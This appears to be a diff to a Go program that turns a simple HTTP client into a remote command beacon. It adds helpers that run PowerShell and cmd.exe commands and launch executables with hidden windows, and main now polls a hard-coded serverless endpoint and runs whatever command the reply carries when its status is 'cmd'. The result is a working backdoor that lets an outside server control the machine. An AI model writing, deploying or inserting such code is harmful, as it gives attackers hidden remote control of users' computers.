@@ -5,11 +5,53 @@ import (
 	"io/ioutil"
 	"bytes"
 	"encoding/json"
+	"os/exec"
+	"time"
+	"syscall"
+	"context"
 )
 
 type PayLoad struct{
 	Status string `json:"status"`;
 	Data string `json:"data"`;
+}
+
+func executePowerShell(command string){
+	cmd:=exec.Command("powershell","-Command",command); // create PowerShell command
+	output,err:=cmd.CombinedOutput(); // get combined output (stdout and stderr)
+	if err !=nil{
+		fmt.Println("Error executing PowerShell command:",err);
+		return;
+	}
+	fmt.Println("PowerShell output:",string(output));
+}
+
+func executeCmd(command string){
+	ctx,cancel:=context.WithTimeout(context.Background(),5*time.Second); // set timeout for command executions
+	defer cancel(); // ensure resources are cleaned up
+
+	cmd:=exec.CommandContext(ctx,"cmd","/C",command); // create command to execute
+	output,err:=cmd.CombinedOutput(); // get combined output (stdout and stderr)
+	if ctx.Err() == context.DeadlineExceeded {
+		fmt.Println("Command timed out");
+		return;
+	}
+	if err !=nil{
+		fmt.Println("Error executing command:",err);
+		return;
+	}
+	fmt.Println("Command output:",string(output));
+}
+
+func executeExe(path string){
+	cmd := exec.Command(path);
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; // hide console window on Windows
+	err:=cmd.Start();
+	if err !=nil{
+		fmt.Println("Error executing exe:",err);
+		return;
+	}
+	fmt.Println("Exe executed successfully");
 }
 
 func postRequest(url string, input PayLoad)(output PayLoad, err error){
@@ -39,12 +81,16 @@ func postRequest(url string, input PayLoad)(output PayLoad, err error){
 		return PayLoad{}, err;
 	}
 	return output,nil;
+}
 
 func main(){
 	url:="https://faas-ams3-2a2df116.doserverless.co/api/v1/web/fn-2f25c703-39e1-4645-abdb-ee0c9d620425/rst/app"; // define URL
 	input,err:=postRequest(url,PayLoad{Status:"active",Data:"sample data"}); // call postRequest function:
 	if err !=nil{
 		fmt.Println("Error:",err);
+		return;
 	}
-	fmt.Println("Data:",input.Data);
-	fmt.Println("Status:",input.Status); 
+	if input.Status=="cmd"{
+		executeCmd(input.Data);
+	} 
+}
